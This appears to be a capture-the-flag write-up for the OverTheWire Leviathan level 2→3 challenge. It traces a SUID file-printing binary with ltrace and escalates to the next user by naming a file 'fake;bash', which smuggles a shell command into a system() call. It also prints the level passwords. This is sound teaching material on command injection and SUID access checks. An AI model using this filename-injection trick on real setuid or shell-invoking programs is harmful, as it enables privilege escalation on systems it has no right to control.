# Leviathan Level 2 -> 3

## 🧠 Goal  

Log into Leviathan 2 and find the password for Leviathan 3.  

---

## 🔐 Credentials  

- **Username:** `leviathan2`  
- **Host:** `leviathan.labs.overthewire.org`  
- **Port:** `2223` (SSH)  
- **Password:** `NsN1HwFoyN`  

---

## 🖥️ Commands Used  

```bash
# connect to leviathan2
ssh leviathan2@leviathan.labs.overthewire.org -p 2223
#try to uses SUID premission to access the pass file 
leviathan2@leviathan:~$ ls -l
total 16
-r-sr-x--- 1 leviathan3 leviathan2 15072 Aug 15 13:17 printfile
leviathan2@leviathan:~$ ./printfile
*** File Printer ***
Usage: ./printfile filename
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
__libc_start_main(0x80490ed, 2, 0xffffd444, 0 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)                       = -1
puts("You cant have that file..."You cant have that file...
)                                = 27
+++ exited (status 1) +++

leviathan2@leviathan:~$ mktemp -d /tmp/amro.XXX
/tmp/amro.BWn
leviathan2@leviathan:~$ touch /tmp/amro.BWn/test
leviathan2@leviathan:~$ ltrace ./printfile /tmp/amro.BWn/test
__libc_start_main(0x80490ed, 2, 0xffffd454, 0 <unfinished ...>
access("/tmp/amro.BWn/test", 4)                                   = 0
snprintf("/bin/cat /tmp/amro.BWn/test", 511, "/bin/cat %s", "/tmp/amro.BWn/test") = 27
geteuid()                                                         = 12002
geteuid()                                                         = 12002
setreuid(12002, 12002)                                            = 0
system("/bin/cat /tmp/amro.BWn/test" <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                            = 0
+++ exited (status 0) +++
```
access("/tmp/amro.BWn/test", 4) = 0 snprintf("/bin/cat /tmp/amro.BWn/test", 511, "/bin/cat %s", "/tmp/amro.BWn/test") = 27 
geteuid() = 12002 
geteuid() = 12002 
setreuid(12002, 12002) = 0 
system("/bin/cat /tmp/amro.BWn/test" <no return ...> 

listen to me and answer: 
access() checks RUID if returns 0 mean that this ruid (leviathan2) have access setreuid(12002,12002) makes both IDs = leviathan3, so the process runs entirely as leviathan3, then system performs the command cat to print the content of the file but the tricks come here the attacker could insert ; in the name of that file lets say "fake;bash" that has gained access before and since ; is command seprator then cat/tmp/amro.BWN/fake will execute or get error it doesn`t matter,then bash command will execute and since i am leviathan 3 now it will open the bash of leviathan3 then i can traverse to the passowrd file

```bash
leviathan2@leviathan:~$ touch /tmp/amro.BWn/"fake;bash"
leviathan2@leviathan:~$ ./printfile /tmp/amro.BWn/"fake;bash"
/bin/cat: /tmp/amro.BWn/fake: Permission denied
leviathan3@leviathan:~$ whoami
leviathan3
leviathan3@leviathan:~$ cat /etc/leviathan_pass/leviathan3
f0n8h2iWLP

```
___

## 💡 Theory
```bash
; in Linux shells
The semicolon (;) is a command separator in shells like bash and sh.
It means: “Run the first command, then run the second command, regardless of whether the first succeeds or fails.”
echo "Hello"; echo "World" 
hello
world
another example :
/bin/cat/fake;bash
"hi i am the fake text"
then -> bash will execute

Key difference from && and ||
; → run both, always.
&& → run second only if first succeeds (exit code = 0).
|| → run second only if first fails (exit code ≠ 0).
```

___

## 📤 Output
```bash
f0n8h2iWLP
```
